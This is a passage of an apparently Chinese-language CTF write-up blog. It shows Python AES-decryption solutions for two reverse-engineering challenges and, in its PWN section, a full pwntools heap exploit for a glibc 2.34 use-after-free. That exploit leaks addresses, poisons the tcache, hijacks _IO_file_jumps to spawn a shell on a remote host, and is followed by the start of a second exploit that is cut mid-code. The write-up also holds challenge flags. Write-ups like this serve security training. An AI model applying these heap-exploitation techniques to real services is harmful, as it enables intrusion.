data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444984/Typera/2023/04/04108af78a95bd369ca3ba2f1a87376d.png\" alt=\"image-20220619201917396\" /></p>\n<p>之后是调用了 <code>com/risid/test/AESEncrypt</code>  对象中的 encrypt 方法，并且通过 <code>SetByteArrayRegion</code>  函数实现 JNI 向 java 层传参数，jadx 中可以找到 encrypt 方法的定义。</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444985/Typera/2023/04/cbb3b62057a98ec580c35b63d77d89f9.png\" alt=\"image-20220619202135278\" /></p>\n<p>JNI 传给该函数的参数 content 是 sscanf 后存入的数组，iv 则是 &quot;0123456789abcdef&quot;，第三个参数则是从 tmp 中解析的对象，可见上述操作主要实现了 AES 的 CBC 加密，主要解密密文的前 16 个字节，已经拿到了 iv 还缺少 key。</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444984/Typera/2023/04/2cb8a1e069fa00e3c92f1926f902ca6e.png\" alt=\"image-20220619203245330\" /></p>\n<p>key 可以在 <code>com/risid/test</code>  包中的 <code>AESGenerator</code>  类中找到，用 python 尝试解密即可。</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Cipher <span class=\"keyword\">import</span> AES</span><br><span class=\"line\">c=<span class=\"built_in\">bytes</span>([<span class=\"number\">0x08</span>, <span class=\"number\">0x32</span>, <span class=\"number\">0x97</span>, <span class=\"number\">0x4C</span>, <span class=\"number\">0x9E</span>, <span class=\"number\">0xE2</span>, <span class=\"number\">0xDB</span>, <span class=\"number\">0x44</span>, <span class=\"number\">0x40</span>, <span class=\"number\">0x92</span>, <span class=\"number\">0x0B</span>, <span class=\"number\">0x0F</span>, <span class=\"number\">0x7C</span>, <span class=\"number\">0x75</span>, <span class=\"number\">0x00</span>, <span class=\"number\">0x56</span>, <span class=\"number\">0x7C</span>, <span class=\"number\">0x13</span>, <span class=\"number\">0xA3</span>, <span class=\"number\">0xBF</span>, <span class=\"number\">0xB4</span>, <span class=\"number\">0x69</span>, <span class=\"number\">0x5D</span>, <span class=\"number\">0x88</span>, <span class=\"number\">0xCE</span>, <span class=\"number\">0x0B</span>, <span class=\"number\">0x97</span>, <span class=\"number\">0x78</span>, <span class=\"number\">0x51</span>, <span class=\"number\">0x05</span>, <span class=\"number\">0x8A</span>, <span class=\"number\">0xD9</span>])</span><br><span class=\"line\">iv=<span class=\"string\">b&#x27;0123456789abcdef&#x27;</span></span><br><span class=\"line\">key=<span class=\"built_in\">bytes</span>.fromhex(<span class=\"string\">&#x27;60aef077a3624ff7725b77dae4c6e004&#x27;</span>)</span><br><span class=\"line\">aes=AES.new(key,AES.MODE_CBC,iv)</span><br><span class=\"line\">m=aes.decrypt(c)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">16</span>):</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(m[i])[<span class=\"number\">2</span>:].zfill(<span class=\"number\">2</span>),end=<span class=\"string\">&#x27;&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">#flag&#123;50c418de67942e713517e900dbd12183&#125;</span></span><br></pre></td></tr></table></figure></p>\n<h3 id=\"easycry\"><a class=\"anchor\" href=\"#easycry\">#</a> easycry</h3>\n<p>re 签到题，exeinfo 查壳，64 位无壳 elf 文件，ida64 载入。</p>\n<p 061cc4091400c082234a57034ed05cf2=\"\"><code>flag</code> ：flag</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444985/Typera/2023/04/c61d07c934a61164fc0d92c28ff9d3ad.png\" alt=\"image-20220619204320327\" /></p>\n<p>findcrypt 插件搜索，发现 AES 的 sbox，并且 main 函数逻辑比较清晰。</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444985/Typera/2023/04/f8cec6059657af8083a6574724aef7e0.png\" alt=\"image-20220619204531962\" /></p>\n<p>v5 是 AES 秘钥，ptr 是扩展秘钥，秘钥是 32 位，sub_1DC5 是秘钥扩展，sub_2181 则是分两个 16 字节进行加密，AES ECB 模式，直接解密即可拿到 flag。</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Cipher <span class=\"keyword\">import</span> AES</span><br><span class=\"line\">k=<span class=\"built_in\">bytes</span>([<span class=\"number\">0x00</span>, <span class=\"number\">0x01</span>, <span class=\"number\">0x02</span>, <span class=\"number\">0x03</span>, <span class=\"number\">0x04</span>, <span class=\"number\">0x05</span>, <span class=\"number\">0x06</span>, <span class=\"number\">0x07</span>, <span class=\"number\">0x08</span>, <span class=\"number\">0x09</span>, <span class=\"number\">0x0A</span>, <span class=\"number\">0x0B</span>, <span class=\"number\">0x0C</span>, <span class=\"number\">0x0D</span>, <span class=\"number\">0x0E</span>, <span class=\"number\">0x0F</span>, <span class=\"number\">0x10</span>, <span class=\"number\">0x11</span>, <span class=\"number\">0x12</span>, <span class=\"number\">0x13</span>, <span class=\"number\">0x14</span>, <span class=\"number\">0x15</span>, <span class=\"number\">0x16</span>, <span class=\"number\">0x17</span>, <span class=\"number\">0x18</span>, <span class=\"number\">0x19</span>, <span class=\"number\">0x1A</span>, <span class=\"number\">0x1B</span>, <span class=\"number\">0x1C</span>, <span class=\"number\">0x1D</span>, <span class=\"number\">0x1E</span>, <span class=\"number\">0x1F</span>])</span><br><span class=\"line\">aes=AES.new(k,AES.MODE_ECB)</span><br><span class=\"line\">c=<span class=\"built_in\">bytes</span>([<span class=\"number\">0x32</span>, <span class=\"number\">0x59</span>, <span class=\"number\">0x1D</span>, <span class=\"number\">0xED</span>, <span class=\"number\">0xBA</span>, <span class=\"number\">0xAC</span>, <span class=\"number\">0x5D</span>, <span class=\"number\">0x48</span>, <span class=\"number\">0xCE</span>, <span class=\"number\">0x1E</span>, <span class=\"number\">0xBD</span>, <span class=\"number\">0x8C</span>, <span class=\"number\">0x43</span>, <span class=\"number\">0xFA</span>, <span class=\"number\">0x34</span>, <span class=\"number\">0x5B</span>, <span class=\"number\">0x9D</span>, <span class=\"number\">0x6E</span>, <span class=\"number\">0xBB</span>, <span class=\"number\">0x25</span>, <span class=\"number\">0xF9</span>, <span class=\"number\">0x17</span>, <span class=\"number\">0x59</span>, <span class=\"number\">0x31</span>, <span class=\"number\">0xDE</span>, <span class=\"number\">0x20</span>, <span class=\"number\">0x36</span>, <span class=\"number\">0xB9</span>, <span class=\"number\">0x5B</span>, <span class=\"number\">0xB5</span>, <span class=\"number\">0x72</span>, <span class=\"number\">0x5B</span>])</span><br><span class=\"line\"><span class=\"built_in\">print</span>(aes.decrypt(c))</span><br><span class=\"line\"><span class=\"comment\">#flag&#123;061cc4091400c082234a57034ed05cf2&#125;</span></span><br></pre></td></tr></table></figure></p>\n<h2 id=\"pwn\"><a class=\"anchor\" href=\"#pwn\">#</a> PWN</h2>\n<h3 id=\"duck\"><a class=\"anchor\" href=\"#duck\">#</a> duck</h3>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444986/Typera/2023/04/b330caffb4d582c144c2e06d22eb3057.png\" alt=\"image-20220619194732802\" /></p>\n<p><strong>flag{693edf4763ef4cdd4f152794028b7f5e}</strong></p>\n<p>libc 2.34 下的 pwn 题，给的漏洞比较基础就是 <strong>UAF</strong>，同时给了 Edit 功能，我们可以很简单的 getshell。</p>\n<p><strong>思路</strong></p>\n<ol>\n<li>利用 UAF leak 堆地址，分配并 Dele 掉多个堆块 leak libc</li>\n<li>分配 chunk 到 Tcache 的 entry 处，利用 Edit 函数我们可以控制任意分配堆块</li>\n<li>修改掉 stderr 的 flag 为  <code>/bin/sh\\0</code></li>\n<li>修改掉  <code>_IO_file_jumps</code>  里的函数指针为  <code>system</code>  ，最后改掉 Top Chunk 的 size 进入  <code>_IO_fflush</code>  触发 getshell。</li>\n</ol>\n<p><strong>Exp</strong></p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python2</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">se      = <span class=\"keyword\">lambda</span> data               :p.send(data) </span><br><span class=\"line\">sa      = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(data)</span><br><span class=\"line\">sla     = <span class=\"keyword\">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class=\"line\">sea     = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class=\"line\">rc      = <span class=\"keyword\">lambda</span> numb=<span class=\"number\">4096</span>          :p.recv(numb)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> delims, drop=<span class=\"literal\">True</span>  :p.recvuntil(delims, drop)</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>, <span class=\"string\">&#x27;\\0&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>, <span class=\"string\">&#x27;\\0&#x27;</span>))</span><br><span class=\"line\">lg = <span class=\"keyword\">lambda</span> name,data : p.success(name + <span class=\"string\">&#x27;: \\033[1;36m 0x%x \\033[0m&#x27;</span> % data)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>(<span class=\"params\"><span class=\"built_in\">breakpoint</span>=<span class=\"string\">&#x27;&#x27;</span></span>):</span><br><span class=\"line\">    glibc_dir = <span class=\"string\">&#x27;~/Exps/Glibc/glibc-2.27/&#x27;</span></span><br><span class=\"line\">    gdbscript = <span class=\"string\">&#x27;directory %smalloc/\\n&#x27;</span> % glibc_dir</span><br><span class=\"line\">    gdbscript += <span class=\"string\">&#x27;directory %sstdio-common/\\n&#x27;</span> % glibc_dir</span><br><span class=\"line\">    gdbscript += <span class=\"string\">&#x27;directory %sstdlib/\\n&#x27;</span> % glibc_dir</span><br><span class=\"line\">    gdbscript += <span class=\"string\">&#x27;directory %slibio/\\n&#x27;</span> % glibc_dir</span><br><span class=\"line\">    elf_base = <span class=\"built_in\">int</span>(os.popen(<span class=\"string\">&#x27;pmap &#123;&#125;| awk \\x27&#123;&#123;print \\x241&#125;&#125;\\x27&#x27;</span>.<span class=\"built_in\">format</span>(p.pid)).readlines()[<span class=\"number\">1</span>], <span class=\"number\">16</span>) <span class=\"keyword\">if</span> elf.pie <span class=\"keyword\">else</span> <span class=\"number\">0</span></span><br><span class=\"line\">    gdbscript += <span class=\"string\">&#x27;b *&#123;:#x&#125;\\n&#x27;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">int</span>(<span class=\"built_in\">breakpoint</span>) + elf_base) <span class=\"keyword\">if</span> <span class=\"built_in\">isinstance</span>(<span class=\"built_in\">breakpoint</span>, <span class=\"built_in\">int</span>) <span class=\"keyword\">else</span> <span class=\"built_in\">breakpoint</span></span><br><span class=\"line\">    gdb.attach(p, gdbscript)</span><br><span class=\"line\">    time.sleep(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./pwn&#x27;</span>)</span><br><span class=\"line\">context(arch = elf.arch, os = <span class=\"string\">&#x27;linux&#x27;</span>,log_level = <span class=\"string\">&#x27;debug&#x27;</span>,terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>, <span class=\"string\">&#x27;splitw&#x27;</span>, <span class=\"string\">&#x27;-hp&#x27;</span>,<span class=\"string\">&#x27;62&#x27;</span>])</span><br><span class=\"line\"><span class=\"comment\"># p = process(&#x27;./pwn&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\"># debug()</span></span><br><span class=\"line\">p = remote(<span class=\"string\">&#x27;192.168.166.147&#x27;</span>,<span class=\"number\">58013</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">menu</span>(<span class=\"params\">c</span>):</span><br><span class=\"line\">    sla(<span class=\"string\">&#x27;Choice: &#x27;</span>,<span class=\"built_in\">str</span>(c))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>():</span><br><span class=\"line\">    menu(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">dele</span>(<span class=\"params\"><span class=\"built_in\">id</span></span>):</span><br><span class=\"line\">    menu(<span class=\"number\">2</span>)</span><br><span class=\"line\">    sla(<span class=\"string\">&#x27;Idx: &#x27;</span>,<span class=\"built_in\">str</span>(<span class=\"built_in\">id</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>(<span class=\"params\"><span class=\"built_in\">id</span></span>):</span><br><span class=\"line\">    menu(<span class=\"number\">3</span>)</span><br><span class=\"line\">    sla(<span class=\"string\">&#x27;Idx: \\n&#x27;</span>,<span class=\"built_in\">str</span>(<span class=\"built_in\">id</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\"><span class=\"built_in\">id</span>,data,size=<span class=\"number\">0x100</span></span>):</span><br><span class=\"line\">    menu(<span class=\"number\">4</span>)</span><br><span class=\"line\">    sla(<span class=\"string\">&#x27;Idx: &#x27;</span>,<span class=\"built_in\">str</span>(<span class=\"built_in\">id</span>))</span><br><span class=\"line\">    sla(<span class=\"string\">&#x27;Size: &#x27;</span>,<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    sea(<span class=\"string\">&#x27;Content: &#x27;</span>,<span class=\"built_in\">str</span>(data))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">add()</span><br><span class=\"line\">dele(<span class=\"number\">0</span>)</span><br><span class=\"line\">show(<span class=\"number\">0</span>)</span><br><span class=\"line\">heap_leak = uu64(ru(<span class=\"string\">&#x27;\\n&#x27;</span>))</span><br><span class=\"line\">heap_base = heap_leak &lt;&lt;<span class=\"number\">12</span></span><br><span class=\"line\">lg(<span class=\"string\">&#x27;heap_leak&#x27;</span>,heap_leak)</span><br><span class=\"line\">lg(<span class=\"string\">&#x27;heap_base&#x27;</span>,heap_base)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">10</span>):</span><br><span class=\"line\">    add() <span class=\"comment\"># 9</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">2</span>+<span class=\"number\">8</span>):</span><br><span class=\"line\">    dele(i)</span><br><span class=\"line\">show(<span class=\"number\">8</span>)</span><br><span class=\"line\">libc_leak = uu64(ru(<span class=\"string\">&#x27;\\x7f&#x27;</span>,drop=<span class=\"literal\">False</span>)[-<span class=\"number\">6</span>:])</span><br><span class=\"line\">libc_base = libc_leak - <span class=\"number\">0x1f2cc0</span></span><br><span class=\"line\">lg(<span class=\"string\">&#x27;libc_leak&#x27;</span>,libc_leak)</span><br><span class=\"line\">lg(<span class=\"string\">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class=\"line\"><span class=\"comment\">#libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class=\"line\">libc = elf.libc</span><br><span class=\"line\">libc.address = libc_base</span><br><span class=\"line\">system_addr = libc.sym.system</span><br><span class=\"line\">bin_sh = libc.search(<span class=\"string\">&#x27;/bin/sh&#x27;</span>).<span class=\"built_in\">next</span>()</span><br><span class=\"line\"></span><br><span class=\"line\">stderr = libc_base + <span class=\"number\">0x1f3680</span></span><br><span class=\"line\">helper = libc_base + <span class=\"number\">0x1f45c0</span></span><br><span class=\"line\"></span><br><span class=\"line\">edit(<span class=\"number\">7</span>,p64(heap_leak^(heap_base+<span class=\"number\">0x100</span>)))</span><br><span class=\"line\">add() <span class=\"comment\"># 11</span></span><br><span class=\"line\"><span class=\"comment\"># pause()</span></span><br><span class=\"line\">add() <span class=\"comment\"># 12</span></span><br><span class=\"line\">edit(<span class=\"number\">12</span>,p64(stderr)*<span class=\"number\">2</span>)</span><br><span class=\"line\">lg(<span class=\"string\">&#x27;ADDR&#x27;</span>,(heap_base+<span class=\"number\">0x100</span>))</span><br><span class=\"line\">add() <span class=\"comment\"># 13</span></span><br><span class=\"line\">edit(<span class=\"number\">13</span>,<span class=\"string\">&#x27;/bin/sh\\0&#x27;</span>)</span><br><span class=\"line\">edit(<span class=\"number\">12</span>,p64(helper)*<span class=\"number\">2</span>)</span><br><span class=\"line\">add()</span><br><span class=\"line\">edit(<span class=\"number\">14</span>,p64(system_addr))</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">3</span>):</span><br><span class=\"line\">    edit(<span class=\"number\">12</span>,p64(heap_base+<span class=\"number\">0xd30</span>)*<span class=\"number\">2</span>)</span><br><span class=\"line\">    add()</span><br><span class=\"line\">    edit(<span class=\"number\">15</span>,p64(<span class=\"number\">0</span>)*<span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">add()</span><br><span class=\"line\">add()</span><br><span class=\"line\">add()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># add()</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"bigduck\"><a class=\"anchor\" href=\"#bigduck\">#</a> bigduck</h3>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444987/Typera/2023/04/fd8d10ea967cd9e8e58b8c6e824fdcd2.png\" alt=\"image-20220619194814107\" /></p>\n<p><strong>flag{afae47ead2452a4b5ba629ec88635a51}</strong></p>\n<p>libc 2.33 下开了沙盒的堆题，其他部分和上题一样。</p>\n<p><strong>思路</strong></p>\n<ol>\n<li>利用 UAF leak 堆地址，分配并 Dele 掉多个堆块 leak libc</li>\n<li>分配 chunk 到 Tcache 的 entry 处，利用 Edit 函数我们可以控制任意分配堆块</li>\n<li>House of kiwi 完成栈迁移，执行 shellcode 读取 flag</li>\n</ol>\n<p><strong>exp</strong></p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python2</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">se      = <span class=\"keyword\">lambda</span> data               :p.send(data) </span><br><span class=\"line\">sa      = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(data)</span><br><span class=\"line\">sla     = <span class=\"keyword\">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class=\"line\">sea     = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class=\"line\">rc      = <span class=\"keyword\">lambda</span> numb=<span class=\"number\">4096</span>          :p.recv(numb)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> delims, drop=<span class=\"literal\">True</span>  :p.recvuntil(delims, drop)</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>, <span class=\"string\">&#x27;\\0&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>, <span class=\"string\">&#x27;\\0&#x27;</span>))</span><br><span class=\"line\">lg = <span class=\"keyword\">lambda</span> name,data : p.success(name + <span class=\"string\">&#x27;: \\033[1;36m 0x%x \\033[0m&#x27;</span> % data)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>(<span class=\"params\"><span class=\"built_in\">breakpoint</span>=<span class=\"string\">&#x27;&#x27;</span></span>):</span><br><span class=\"line\">    glibc_dir = <span class=\"string\">&#x27;~/Exps/Glibc/glibc-2.27/&#x27;</span></span><br><span class=\"line\">    gdbscript = <span class=\"string\">&#x27;directory %smalloc/\\n&#x27;</span> % glibc_dir</span><br><span class=\"line\">    gdbscript += <span class=\"string\">&#x27;directory %sstdio-common/\\n&#x27;</span> % glibc_dir</span><br><span class=\"line\">    gdbscript += <span class=\"string\">&#x27;directory %sstdlib/\\n&#x27;</span> % glibc_dir</span><br><span class=\"line\">    gdbscript += <span class=\"string\">&#x27;directory %slibio/\\n&#x27;</span> % glibc_dir</span><br><span class=\"line\">    elf_base = <span class=\"built_in\">int</span>(os.popen(<span class=\"string\">&#x27;pmap &#123;&#125;| awk \\x27&#123;&#123;print \\x241&#125;&#125;\\x27&#x27;</span>.<span class=\"built_in\">format</span>(p.pid)).readlines()[<span class=\"number\">1</span>], <span class=\"number\">16</span>) <span class=\"keyword\">if</span> elf.pie <span class=\"keyword\">else</span> <span class=\"number\">0</span></span><br><span class=\"line\">    gdbscript += <span class=\"string\">&#x27;b *&#123;:#x&#125;\\n&#x27;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">int</span>(<span class=\"built_in\">breakpoint</span>) + elf_base) <span 